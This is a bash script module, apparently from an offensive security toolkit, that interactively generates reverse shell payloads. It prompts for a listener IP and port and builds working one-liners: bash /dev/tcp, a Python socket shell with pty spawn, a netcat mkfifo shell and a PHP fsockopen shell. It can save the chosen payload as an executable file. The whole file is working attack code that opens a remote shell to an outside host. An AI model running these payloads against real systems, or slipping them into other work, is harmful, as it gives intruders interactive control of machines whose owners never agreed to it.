#!/bin/bash

# ==========================================
# Module: Payloads (Phase 2 - Complete)
# Generates reverse shells & saves to file
# ==========================================

# --- Helper: Get User Inputs ---
get_payload_info() {
    echo -e "${CYAN}[i] Configuration needed for payload:${NC}"
    
    # Try to detect IP
    default_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
    read -p "   Enter LHOST (Your IP) [$default_ip]: " lhost
    lhost=${lhost:-$default_ip}
    
    read -p "   Enter LPORT (Listening Port): " lport
    
    if [[ -z "$lport" ]]; then
        echo -e "${RED}[!] Port is required!${NC}"
        return 1
    fi
}

# --- Payload Logic ---

# We store the payload in a variable 'PAYLOAD_RESULT' instead of just echoing it
gen_bash_tcp() {
    PAYLOAD_RESULT="bash -i >& /dev/tcp/$lhost/$lport 0>&1"
}

gen_python() {
    PAYLOAD_RESULT="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
}

gen_nc_mkfifo() {
    PAYLOAD_RESULT="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
}

gen_php_exec() {
    PAYLOAD_RESULT="php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
}

# --- Output Handling ---

handle_output() {
    echo ""
    echo -e "${YELLOW}--- GENERATED PAYLOAD ---${NC}"
    echo "$PAYLOAD_RESULT"
    echo -e "${YELLOW}-------------------------${NC}"
    echo ""
    
    read -p "Do you want to save this to a file? (y/N) > " save_opt
    if [[ "$save_opt" =~ ^[Yy]$ ]]; then
        read -p "Enter filename (e.g., shell.sh): " fname
        echo "$PAYLOAD_RESULT" > "$fname"
        chmod +x "$fname"
        echo -e "${GREEN}[+] Payload saved to $(pwd)/$fname${NC}"
    fi
}

# --- Menu ---

payload_menu() {
    echo -e "${CYAN}--- Payload Generator ---${NC}"
    echo "1. Bash (TCP Device)"
    echo "2. Python3 (Stable)"
    echo "3. Netcat (mkfifo fallback)"
    echo "4. PHP (exec)"
    echo "5. Back"
    echo ""
    read -p "Select Payload Type > " p_choice

    if [[ "$p_choice" == "5" ]]; then return; fi

    get_payload_info
    [ $? -ne 0 ] && return

    case $p_choice in
        1) gen_bash_tcp ;;
        2) gen_python ;;
        3) gen_nc_mkfifo ;;
        4) gen_php_exec ;;
        *) echo "Invalid option"; return ;;
    esac

    handle_output
    
    read -p "Press Enter to continue..."
}
